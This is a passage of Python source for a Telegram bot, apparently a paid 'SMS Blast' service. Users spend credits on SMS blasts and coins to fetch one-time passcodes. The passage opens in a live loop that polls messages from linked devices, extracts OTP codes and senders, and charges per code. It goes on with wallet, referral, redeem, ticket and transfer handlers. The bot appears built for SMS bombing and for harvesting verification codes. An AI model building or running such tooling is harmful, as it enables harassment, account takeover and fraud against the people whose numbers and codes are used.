                    if sess["coins_spent"] + cost <= get_user_coins(uid, d):
                        if deduct_coins(uid, cost, d, "otp-live"):
                            sess["coins_spent"] += cost
                            k = str(uid)
                            d["users"][k]["otp_uses"] = d["users"][k].get("otp_uses", 0) + 1
                            d["stats"]["otp_fetches"] = d.get("stats", {}).get("otp_fetches", 0) + 1
                            record_otp_history(
                                d, uid,
                                otp=m["otps"][0] if m["otps"] else "?",
                                sender=m["sender"],
                                device=dv,
                                cost_paid=cost,
                            )
                    else:
                        break
            else:
                for m in initial_found:
                    record_otp_history(
                        d, uid,
                        otp=m["otps"][0] if m["otps"] else "?",
                        sender=m["sender"],
                        device=dv,
                        cost_paid=0,
                    )
            save()

        # initial report
        if initial_found:
            txt = f"{em(EMOJI_OTP, '🔐')} <b>Initial OTPs ({len(initial_found)})</b>\n\n"
            for o in initial_found[:5]:
                codes = ", ".join(o["otps"]) if o["otps"] else "?"
                txt += (
                    f"🔐 <code>{codes}</code>\n"
                    f"📤 {esc(o['sender'][:40])}\n"
                    f"💬 <i>{esc(o['body'][:200])}</i>\n\n"
                )
        else:
            txt = (
                f"⏱ <b>Live OTP Mode ON</b>\n\n"
                f"📞 <code>{esc(dv.get('phone') or 'no number')}</code>\n"
                f"<i>No fresh OTP in last 60s — watching for new…</i>"
            )
        try:
            await cq.bot.edit_message_text(
                txt,
                chat_id=sess["chat_id"],
                message_id=sess["msg_id"],
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [btn("stop live", "otp:live_stop", EMOJI_CROSS, "🛑", style="danger")]
                ]),
                parse_mode="HTML",
            )
        except Exception:
            pass

        end = started + _OTP_LIVE_TIMEOUT
        # poll loop
        while now_ts() < end:
            await asyncio.sleep(_OTP_POLL_INTERVAL)
            if uid not in OTP_LIVE_SESSIONS:
                return
            try:
                cur = await collect_all_messages(dv, limit=_OTP_MAX_SCAN)
            except Exception:
                continue

            new_otps = []
            for m in cur:
                if m["hash"] in sess["seen_hashes"]:
                    continue
                sess["seen_hashes"].add(m["hash"])
                if not m["has_otp"]:
                    continue
                if m["ts"] < started - 60:
                    continue
                new_otps.append(m)

            if not new_otps:
                continue

            # deduct per OTP
            if not is_priv:
                affordable = 0
                for m in new_otps:
                    if sess["coins_spent"] + cost <= get_user_coins(uid, d):
                        if deduct_coins(uid, cost, d, "otp-live"):
                            sess["coins_spent"] += cost
                            k = str(uid)
                            d["users"][k]["otp_uses"] = d["users"][k].get("otp_uses", 0) + 1
                            d["stats"]["otp_fetches"] = d.get("stats", {}).get("otp_fetches", 0) + 1
                            record_otp_history(
                                d, uid,
                                otp=m["otps"][0] if m["otps"] else "?",
                                sender=m["sender"],
                                device=dv,
                                cost_paid=cost,
                            )
                            affordable += 1
                    else:
                        try:
                            await cq.bot.send_message(
                                uid,
                                f"🪙 <b>Out of coins!</b> Live mode paused for new OTPs.",
                                parse_mode="HTML",
                            )
                        except Exception:
                            pass
                        new_otps = new_otps[:affordable]
                        break
            else:
                for m in new_otps:
                    record_otp_history(
                        d, uid,
                        otp=m["otps"][0] if m["otps"] else "?",
                        sender=m["sender"],
                        device=dv,
                        cost_paid=0,
                    )
            save()

            if not new_otps:
                continue

            txt = f"{em(EMOJI_OTP, '🔐')} <b>NEW OTP!</b>\n\n"
            for o in new_otps[-5:]:
                codes = ", ".join(o["otps"]) if o["otps"] else "?"
                txt += (
                    f"🔐 <code>{codes}</code>\n"
                    f"📤 {esc(o['sender'][:40])}\n"
                    f"🕐 {fmt_time_short(o['ts'])}\n"
                    f"💬 <i>{esc(o['body'][:200])}</i>\n\n"
                )
            remaining = max(0, end - now_ts())
            txt += f"⏱ Live: {remaining // 60}m {remaining % 60}s left"
            if len(txt) > 4000:
                txt = txt[:3990] + "\n<i>...</i>"
            try:
                await cq.bot.edit_message_text(
                    txt,
                    chat_id=sess["chat_id"],
                    message_id=sess["msg_id"],
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                        [btn("stop live", "otp:live_stop", EMOJI_CROSS, "🛑", style="danger")]
                    ]),
                    parse_mode="HTML",
                )
            except Exception:
                pass

        # ended
        total_cost = sess["coins_spent"]
        try:
            end_txt = (
                f"⏱ <b>Live mode ended</b>\n\n"
                f"🪙 Total coins spent: <b>{total_cost}</b>\n"
            )
            if total_cost == 0:
                end_txt += f"💰 <i>No OTP found — no coins deducted.</i>"
            await cq.bot.edit_message_text(
                end_txt,
                chat_id=sess["chat_id"],
                message_id=sess["msg_id"],
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [btn("check NEW", f"otp:fetch:new:{idx}", EMOJI_NEW, "🆕", style="primary")],
                    [btn("back", "user:otp:menu", EMOJI_GEAR, "🔙")],
                ]),
                parse_mode="HTML",
            )
        except Exception:
            pass
        OTP_LIVE_SESSIONS.pop(uid, None)

    t = asyncio.create_task(live_loop())
    sess["task"] = t

@R.callback_query(F.data == "otp:live_stop")
async def otp_live_stop(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    sess = OTP_LIVE_SESSIONS.get(uid)
    if sess and sess.get("task") and not sess["task"].done():
        try:
            sess["task"].cancel()
        except Exception:
            pass
    OTP_LIVE_SESSIONS.pop(uid, None)
    try:
        await cq.answer("🛑 Stopped!")
    except Exception:
        pass
    await safe_edit(cq, f"🛑 <b>Live mode stopped</b>", kb([(sc("back"), "user:otp:menu")]))

# ============================================================
#  USER WALLET
# ============================================================
@R.callback_query(F.data == "user:wallet")
async def user_wallet(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    allowed, reason = check_service(uid, d, "wallet")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    cr = get_user_credits(uid, d)
    co = get_user_coins(uid, d)
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💳')} <b>My Wallet</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{cr}</b>\n"
        f"  <i>Used for SMS blasts</i>\n\n"
        f"{em(EMOJI_COIN, '🪙')} Coins: <b>{co}</b>\n"
        f"  <i>Used for Get OTP ({get_otp_cost(d)} per fetch, refund if empty)</i>",
        wallet_kb(),
    )

@R.callback_query(F.data == "user:coin_ledger")
async def user_coin_ledger(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    hist = d.get("transactions", {}).get(str(uid), [])
    lines = [f"{em(EMOJI_COIN, '🪙')} <b>Transaction History</b>\n"]
    if not hist:
        lines.append("<i>No transactions yet.</i>")
    else:
        for e in reversed(hist[-30:]):
            ts = fmt_time(e.get("ts", 0))
            cur = e.get("currency", "?")
            delta = e.get("delta", 0)
            reason = e.get("reason", "")
            sign = "+" if delta > 0 else ""
            ic = "💰" if cur == "credits" else "🪙"
            lines.append(f"{ic} {sign}{delta} {cur} — <i>{esc(reason)[:40]}</i>\n   🕐 {ts}")
    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), "user:wallet")]))

# ============================================================
#  REFER
# ============================================================
@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    allowed, reason = check_service(uid, d, "refer")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return
    code = generate_refer_code(uid, d)
    save()
    try:
        await cq.answer()
    except Exception:
        pass
    rc = d.get("settings", {}).get("ref_credits", 3)
    rcoin = d.get("settings", {}).get("ref_coins", 1)
    try:
        me = await cq.bot.get_me()
    except Exception:
        me = None
    un = me.username if me else "bot"
    referred = len(d.get("referral_tree", {}).get(str(uid), []))
    await safe_edit(
        cq,
        f"{em(EMOJI_USER, '👥')} <b>Referral</b>\n\n"
        f"Each referral = <b>{rc} credits + {rcoin} coins</b>\n"
        f"Your referrals: <b>{referred}</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} <code>{esc(code)}</code>\n\n"
        f"{em(EMOJI_GEAR, '🔗')} <code>https://t.me/{un}?start={code}</code>",
        kb([
            (sc("leaderboard"), "user:leaderboard"),
            (sc("back"), "user:home"),
        ]),
    )

# ============================================================
#  LEADERBOARD (user view)
# ============================================================
@R.callback_query(F.data == "user:leaderboard")
async def user_leaderboard(cq: CallbackQuery, state: FSMContext):
    d = load()
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(cq, leaderboard_text(d, "all"), leaderboard_kb("user", "all"))

@R.callback_query(F.data.regexp(r"^user:lb:show:(7d|30d|all)$"))
async def user_lb_show(cq: CallbackQuery, state: FSMContext):
    d = load()
    try:
        await cq.answer()
    except Exception:
        pass
    period = cq.data.split(":")[-1]
    await safe_edit(cq, leaderboard_text(d, period), leaderboard_kb("user", period))

# ============================================================
#  REDEEM
# ============================================================
@R.callback_query(F.data == "user:redeem")
async def redeem_user_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    allowed, reason = check_service(uid, d, "redeem")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.redeem_code)
    await safe_edit(
        cq,
        f"{em(EMOJI_GIFT, '🎁')} <b>Redeem</b>\n\nEnter code:",
        kb([(sc("cancel"), "user:home")]),
    )

@R.message(S.redeem_code)
async def redeem_user_done(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    code = (m.text or "").strip().upper()
    await state.clear()
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} Invalid code!",
            reply_markup=kb([(sc("home"), "user:home")]),
            parse_mode="HTML",
        )
        return
    cd = codes[code]
    if cd.get("uses_left", 0) <= 0:
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} Expired!",
            reply_markup=kb([(sc("home"), "user:home")]),
            parse_mode="HTML",
        )
        return
    if uid in cd.get("used_by", []):
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} Already used!",
            reply_markup=kb([(sc("home"), "user:home")]),
            parse_mode="HTML",
        )
        return
    c = cd["credits"]
    cur = cd.get("currency", "credits")
    if cur == "coins":
        add_coins(uid, c, d, False, f"redeem-{code}")
    else:
        add_credits(uid, c, d, False, f"redeem-{code}")
    cd["uses_left"] = cd.get("uses_left", 1) - 1
    cd.setdefault("used_by", []).append(uid)
    log_audit(d, "redeem_success", uid, f"amount={c} currency={cur} code={code}")
    save()
    _spawn(send_log(m.bot, (
        "🎟 <b>REDEEM SUCCESS</b>\n"
        f"👤 {esc(m.from_user.full_name or 'User')} (@{esc(m.from_user.username or 'None')})\n"
        f"🆔 <code>{uid}</code>\n"
        f"💳 Amount: <b>{c} {esc(cur)}</b>\n"
        f"🕒 {fmt_time(now_ts())}"
    )))
    ic = "🪙" if cur == "coins" else "💰"
    await m.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>+{c} {cur}</b> {ic}\n"
        f"Balance: 💰{get_user_credits(uid, d)} 🪙{get_user_coins(uid, d)}",
        reply_markup=kb([(sc("home"), "user:home")]),
        parse_mode="HTML",
    )

# ============================================================
#  DAILY BONUS (fixed key mismatch)
# ============================================================
@R.callback_query(F.data == "user:daily_bonus")
async def daily_bonus(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    allowed, reason = check_service(uid, d, "daily_bonus")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return
    k = str(uid)
    if k not in d.get("users", {}):
        try:
            await cq.answer("❌ Register first")
        except Exception:
            pass
        return
    last = d["users"][k].get("daily_bonus_ts", 0)
    bonus = int(d.get("settings", {}).get("daily_bonus_credits", _DAILY_BONUS_COINS))
    cooldown = _DAILY_BONUS_HOURS * 3600
    now = now_ts()
    if now - last < cooldown:
        wait = cooldown - (now - last)
        try:
            await cq.answer(f"⏳ Try again in {fmt_duration(wait)}", show_alert=True)
        except Exception:
            pass
        return
    d["users"][k]["daily_bonus_ts"] = now
    add_credits(uid, bonus, d, False, "daily-bonus")
    save()
    try:
        await cq.answer(f"🎁 +{bonus} credits!", show_alert=True)
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_GIFT, '🎁')} <b>Daily Bonus</b>\n\n"
        f"Received: <b>+{bonus} credits</b>\n"
        f"Your credits: <b>{get_user_credits(uid, d)}</b>\n\n"
        f"Come back in {_DAILY_BONUS_HOURS}h.",
        kb([(sc("back"), "user:home")]),
    )

# ============================================================
#  USER STATS / HISTORY / INFO / SUPPORT
# ============================================================
@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    ud = d["users"].get(str(uid), {})
    referred = len(d.get("referral_tree", {}).get(str(uid), []))
    await safe_edit(
        cq,
        f"{em(EMOJI_CHART, '📊')} <b>Your Stats</b>\n\n"
        f"💰 Credits: <b>{ud.get('credits', 0)}</b>\n"
        f"🪙 Coins: <b>{ud.get('coins', 0)}</b>\n"
        f"📤 SMS Sent: <b>{ud.get('uses', 0)}</b>\n"
        f"🔐 OTP Fetched: <b>{ud.get('otp_uses', 0)}</b>\n"
        f"👥 Referrals: <b>{referred}</b>\n"
        f"📅 Joined: <b>{fmt_time(ud.get('joined_at', 0))}</b>\n"
        f"🕐 Last active: <b>{fmt_age(ud.get('last_active', 0))}</b>",
        kb([(sc("back"), "user:home")]),
    )

@R.callback_query(F.data == "user:sms_history")
async def user_sms_hist_self(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    h = d.get("sms_history", {}).get(str(uid), [])[-10:]
    if not h:
        txt = f"{em(EMOJI_CLOCK, '📜')} <b>History</b>\n\nEmpty."
    else:
        lines = [f"{em(EMOJI_CLOCK, '📜')} <b>Your SMS History</b>\n"]
        for i, e in enumerate(reversed(h), 1):
            ts = fmt_time(e.get("timestamp", 0))
            nm = e.get("number", "?")
            mp = esc(str(e.get("message", ""))[:40])
            st = e.get("status", "?")
            ic = "✅" if st == "sent" else "🛑" if st == "stopped" else "⏳"
            lines.append(f"{i}. {ic} <code>{esc(mask_number(nm))}</code> [{ts}]\n   <i>{mp}</i>")
        txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), "user:home")]))

@R.callback_query(F.data == "user:otp_history")
async def user_otp_hist_self(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    h = d.get("otp_history", {}).get(str(uid), [])[-20:]
    if not h:
        txt = f"{em(EMOJI_OTP, '🔐')} <b>OTP History</b>\n\nEmpty."
    else:
        lines = [f"{em(EMOJI_OTP, '🔐')} <b>Your OTPs</b>\n"]
        for i, e in enumerate(reversed(h), 1):
            ts = fmt_time(e.get("timestamp", 0))
            otp = e.get("otp", "?")
            sender = esc(str(e.get("sender", "?"))[:30])
            lines.append(f"{i}. 🔐 <code>{otp}</code> — {sender}\n   🕐 {ts}")
        txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), "user:home")]))

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    allowed, reason = check_service(uid, d, "pricing")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        try:
            await cq.answer("❌ No plans!", show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    txt = f"{em(EMOJI_MONEY, '💰')} <b>Buy</b>\n\n"
    for p in plans:
        cur = p.get("currency", "credits")
        amt = p.get("credits", 0) if cur == "credits" else p.get("coins", 0)
        ic = "💰" if cur == "credits" else "🪙"
        txt += f"📋 <b>{esc(p['name'])}</b>\n   {p['price']} INR = {amt} {ic}\n\n"
    rows = []
    for p in plans:
        rows.append([btn_url(f"Buy {p['name'][:20]}", p['payment_link'], EMOJI_MONEY, "💳", style="success")])
    rows.append([btn("back", "user:home", EMOJI_GEAR, "🔙")])
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    d = load()
    try:
        await cq.answer()
    except Exception:
        pass
    od = get_owner_display(d)
    ol = f"👤 Owner: <a href='{SUPER_ADMIN_LINK}'>{esc(od)}</a>\n" if od else ""
    await safe_edit(
        cq,
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\n\n{ol}\n"
        f"💰 Credits = SMS blast\n"
        f"🪙 Coins = Get OTP\n"
        f"🔐 OTP refund if empty result\n\n"
        f"<i>Refer friends to earn free credits!</i>",
        kb([(sc("back"), "user:home")]),
    )

# ============================================================
#  SUPPORT — user side (with reply system)
# ============================================================
@R.callback_query(F.data == "user:support")
async def user_support(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    allowed, reason = check_service(uid, d, "support")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    open_tickets = user_open_tickets(d, uid)
    rows = [
        (sc("open new ticket"), "user:ticket:new"),
        (sc("my tickets"), "user:tickets:menu"),
        (sc("contact owner"), "user:contact_owner"),
        (sc("back"), "user:home"),
    ]
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '📩')} <b>Support</b>\n\n"
        f"Open tickets: <b>{len(open_tickets)}</b>\n\n"
        f"Open a ticket for help. Owner will reply in the thread.",
        kb(rows),
    )

@R.callback_query(F.data == "user:ticket:new")
async def user_ticket_new(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.ticket_new_text)
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '📩')} <b>New Ticket</b>\n\nType your message:",
        kb([(sc("cancel"), "user:support")]),
    )

@R.message(S.ticket_new_text)
async def user_ticket_text(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    txt = (m.text or "").strip()
    if not txt:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    await state.clear()
    ticket = create_ticket(d, uid, m.from_user.full_name or "User", txt)
    log_audit(d, "ticket_created", uid, f"id={ticket['id']}")
    save()

    try:
        await m.bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_BELL, '📩')} <b>New Ticket</b>\n\n"
            f"👤 {esc(m.from_user.full_name or 'User')}\n"
            f"🆔 <code>{uid}</code>\n"
            f"🎫 ID: <code>{ticket['id']}</code>\n\n"
            f"💬 {esc(txt[:500])}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [btn("open ticket", f"owner:ticket:view:{ticket['id']}", EMOJI_BELL, "📩", style="primary")]
            ]),
        )
    except Exception:
        pass

    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Ticket created!\n"
        f"🎫 ID: <code>{ticket['id']}</code>\n\n"
        f"<i>Owner will reply soon.</i>",
        reply_markup=kb([
            (sc("view ticket"), f"user:ticket:view:{ticket['id']}"),
            (sc("home"), "user:home"),
        ]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:tickets:menu")
async def user_tickets_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    tickets = user_open_tickets(d, uid)
    if not tickets:
        await safe_edit(
            cq,
            f"{em(EMOJI_BELL, '📩')} <b>My Tickets</b>\n\n<i>No open tickets.</i>",
            kb([(sc("new ticket"), "user:ticket:new"), (sc("back"), "user:support")]),
        )
        return
    rows = []
    for t in tickets[-10:]:
        replies = d.get("ticket_replies", {}).get(t["id"], [])
        label = f"{t['id'][-6:]} · {len(replies)} replies"
        rows.append([btn(label, f"user:ticket:view:{t['id']}", EMOJI_BELL, "📩")])
    rows.append([btn("back", "user:support", EMOJI_GEAR, "🔙")])
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '📩')} <b>My Tickets ({len(tickets)})</b>\n\nSelect to view:",
        InlineKeyboardMarkup(inline_keyboard=rows),
    )

@R.callback_query(F.data.regexp(r"^user:ticket:view:(.+)$"))
async def user_ticket_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    tid = cq.data.split(":", 3)[3]
    t = find_ticket(d, tid)
    if not t or t.get("uid") != uid:
        try:
            await cq.answer("❌ Ticket not found", show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(cq, ticket_view_text(d, tid, "user"), ticket_view_kb(tid, is_owner=False))

@R.callback_query(F.data.regexp(r"^user:ticket:reply:(.+)$"))
async def user_ticket_reply(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    tid = cq.data.split(":", 3)[3]
    t = find_ticket(d, tid)
    if not t or t.get("uid") != uid:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    await state.update_data(reply_ticket_id=tid)
    await state.set_state(S.ticket_reply_text)
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_FILE, '✏️')} <b>Reply to ticket</b>\n\nType your reply:",
        kb([(sc("cancel"), f"user:ticket:view:{tid}")]),
    )

@R.message(S.ticket_reply_text)
async def user_ticket_reply_do(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    fsmd = await state.get_data()
    tid = fsmd.get("reply_ticket_id")
    txt = (m.text or "").strip()
    await state.clear()
    if not tid or not txt:
        await m.answer("❌ Empty.", parse_mode="HTML")
        return
    t = find_ticket(d, tid)
    if not t:
        await m.answer("❌ Ticket gone.", parse_mode="HTML")
        return
    add_ticket_reply(d, tid, uid, txt)
    save()

    # notify owner
    try:
        await m.bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_BELL, '📩')} <b>Ticket reply</b>\n\n"
            f"🎫 <code>{tid}</code>\n"
            f"👤 {esc(m.from_user.full_name or 'User')} (<code>{uid}</code>)\n\n"
            f"💬 {esc(txt[:500])}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [btn("open ticket", f"owner:ticket:view:{tid}", EMOJI_BELL, "📩", style="primary")]
            ]),
        )
    except Exception:
        pass

    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Reply sent.",
        reply_markup=kb([(sc("view ticket"), f"user:ticket:view:{tid}")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:contact_owner")
async def user_contact_owner(cq: CallbackQuery, state: FSMContext):
    d = load()
    try:
        await cq.answer()
    except Exception:
        pass
    od = get_owner_display(d)
    await safe_edit(
        cq,
        f"{em(EMOJI_CROWN, '👤')} <b>Contact Owner</b>\n\n"
        f"{esc(od)}\n"
        f"<a href='{SUPER_ADMIN_LINK}'>{esc(SUPER_ADMIN_LINK)}</a>",
        kb([(sc("back"), "user:support")]),
    )

# ============================================================
#  COMING SOON (user view)
# ============================================================
@R.callback_query(F.data == "user:upcoming")
async def user_upcoming(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    allowed, reason = check_service(uid, d, "upcoming")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return
    if not d.get("upcoming_visible", True):
        try:
            await cq.answer("Coming Soon section is currently hidden.", show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(cq, upcoming_user_text(d), upcoming_user_kb())

# ============================================================
#  TRANSFER — credits & coins
# ============================================================
@R.callback_query(F.data == "user:transfer:menu")
async def transfer_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    allowed, reason = check_service(uid, d, "transfer")
    if not allowed:
        try:
            await cq.answer(reason[:200], show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💸')} <b>Transfer</b>\n\nWhat to transfer?",
        InlineKeyboardMarkup(inline_keyboard=[
            [btn("💰 credits", "user:transfer:credits", EMOJI_MONEY, "💰", style="primary"),
             btn("🪙 coins", "user:transfer:coins", EMOJI_COIN, "🪙", style="primary")],
            [btn("back", "user:home", EMOJI_GEAR, "🔙")],
        ]),
    )

@R.callback_query(F.data == "user:transfer:credits")
async def transfer_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    cur = get_user_credits(uid, d)
    if cur < 2:
        try:
            await cq.answer("❌ Min 2 credits!")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.transfer_credits_uid)
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💸')} <b>Transfer Credits</b>\n\n"
        f"Your: <b>{cur}</b>\nMax: half\n\n"
        f"Step 1/2: Target user ID:",
        kb([(sc("cancel"), "user:transfer:menu")]),
    )

@R.message(S.transfer_credits_uid)
async def transfer_credits_uid(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    try:
        t = int((m.text or "").strip())
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send valid ID.", parse_mode="HTML")
        return
    if t == uid:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Cannot transfer to self.", parse_mode="HTML")
        return
    if str(t) not in d.get("users", {}):
        await m.answer(f"{em(EMOJI_CROSS, '❌')} User not found.", parse_mode="HTML")
        return
    cur = get_user_credits(uid, d)
    if cur < 2:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Min 2!", parse_mode="HTML")
        return
    await state.update_data(transfer_target=t)
    await state.set_state(S.transfer_credits_amount)
    await m.answer(
        f"Step 2/2\nTo: <code>{t}</code>\nMax: <b>{cur // 2}</b>\n\nAmount:",
        parse_mode="HTML",
    )

@R.message(S.transfer_credits_amount)
async def transfer_credits_amt(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    try:
        a = int((m.text or "").strip())
        if a <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    t = fsmd.get("transfer_target")
    cur = get_user_credits(uid, d)
    mt = cur // 2
    if a > mt:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Max {mt}!", parse_mode="HTML")
        return
    if not deduct_credits(uid, a, d, "transfer-out"):
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient.", parse_mode="HTML")
        return
    add_credits(t, a, d, False, "transfer-in")
    save()
    await state.clear()
    try:
        await m.bot.send_message(t, f"💸 <b>+{a} credits from {uid}</b>", parse_mode="HTML")
    except Exception:
        pass
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Sent {a} credits to <code>{t}</code>.",
        reply_markup=kb([(sc("home"), "user:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:transfer:coins")
async def transfer_coins_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    cur = get_user_coins(uid, d)
    if cur < 1:
        try:
            await cq.answer("❌ Min 1 coin!")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.transfer_coins_uid)
    await safe_edit(
        cq,
        f"{em(EMOJI_COIN, '🪙')} <b>Transfer Coins</b>\n\n"
        f"Your: <b>{cur}</b>\n\n"
        f"Step 1/2: Target user ID:",
        kb([(sc("cancel"), "user:transfer:menu")]),
    )

@R.message(S.transfer_coins_uid)
async def transfer_coins_uid(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    try:
        t = int((m.text or "").strip())
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send valid ID.", parse_mode="HTML")
        return
    if t == uid:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Cannot self.", parse_mode="HTML")
        return
    if str(t) not in d.get("users", {}):
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Not found.", parse_mode="HTML")
        return
    await state.update_data(transfer_target=t)
    await state.set_state(S.transfer_coins_amount)
    await m.answer(f"Step 2/2\nTo: <code>{t}</code>\n\nAmount:", parse_mode="HTML")

@R.message(S.transfer_coins_amount)
async def transfer_coins_amt(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    try:
        a = int((m.text or "").strip())
        if a <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    t = fsmd.get("transfer_target")
    cur = get_user_coins(uid, d)
    if a > cur:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Max {cur}!", parse_mode="HTML")
        return
    if not deduct_coins(uid, a, d, "transfer-out"):
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient.", parse_mode="HTML")
        return
    add_coins(t, a, d, False, "transfer-in")
    save()
    await state.clear()
    try:
        await m.bot.send_message(t, f"🪙 <b>+{a} coins from {uid}</b>", parse_mode="HTML")
    except Exception:
        pass
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Sent {a} coins to <code>{t}</code>.",
        reply_markup=kb([(sc("home"), "user:home")]),
        parse_mode="HTML",
    )

# ============================================================
#  GIFT COINS
# ============================================================
@R.callback_query(F.data == "user:gift:menu")
